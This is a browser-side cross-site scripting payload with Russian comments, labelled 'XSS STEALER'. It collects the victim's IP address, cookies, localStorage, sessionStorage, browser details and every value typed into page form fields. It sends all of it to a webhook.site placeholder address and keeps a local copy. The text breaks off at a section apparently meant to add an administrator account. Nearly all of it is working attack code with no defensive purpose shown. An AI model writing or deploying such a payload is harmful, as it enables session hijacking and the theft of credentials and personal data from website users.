<script>
(function() {
    console.log("🔥 XSS STEALER - EXECUTING");

    // === 2.1 КРАДЁМ IP ===
    const ipUrls = [
        'https://api.ipify.org?format=json',
        'https://ipapi.co/json/',
        'https://api.ip.sb/geoip'
    ];

    let ipData = { ip: 'unknown', country: 'unknown', city: 'unknown' };

    for (const url of ipUrls) {
        try {
            fetch(url, { mode: 'cors' })
                .then(r => r.json())
                .then(data => {
                    if (data.ip) {
                        ipData = data;
                        console.log('[+] IP stolen:', ipData);
                    }
                })
                .catch(() => {});
        } catch(e) {}
    }

    // === 2.2 КРАДЁМ КУКИ ===
    const cookies = document.cookie || 'No cookies';

    // === 2.3 КРАДЁМ localStorage ===
    const localStorageData = {};
    for (let key in localStorage) {
        try {
            localStorageData[key] = localStorage[key];
        } catch(e) {}
    }

    // === 2.4 КРАДЁМ sessionStorage ===
    const sessionData = {};
    for (let key in sessionStorage) {
        try {
            sessionData[key] = sessionStorage[key];
        } catch(e) {}
    }

    // === 2.5 КРАДЁМ ИНФОРМАЦИЮ О БРАУЗЕРЕ ===
    const browserInfo = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        url: window.location.href
    };

    // === 2.6 КРАДЁМ ВВЕДЁННЫЕ ДАННЫЕ ===
    const formData = {};
    document.querySelectorAll('input, textarea, select').forEach(el => {
        const key = el.name || el.id || el.tagName;
        if (el.value) {
            formData[key] = el.value;
        }
    });

    // === 2.7 ОТПРАВЛЯЕМ ВСЁ НА WEBHOOK ===
    const stolenData = {
        timestamp: new Date().toISOString(),
        ip: ipData,
        cookies: cookies,
        localStorage: localStorageData,
        sessionStorage: sessionData,
        browser: browserInfo,
        formData: formData
    };

    // Отправляем на webhook
    fetch('https://webhook.site/your-unique-id', {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(stolenData)
    });

    // === 2.8 СОХРАНЯЕМ В localStorage ===
    const allStolen = JSON.parse(localStorage.getItem('xss_stolen') || '[]');
    allStolen.push(stolenData);
    localStorage.setItem('xss_stolen', JSON.stringify(allStolen));

    // === 2.9 ДОБАВЛЯЕМ АДМИНА ===
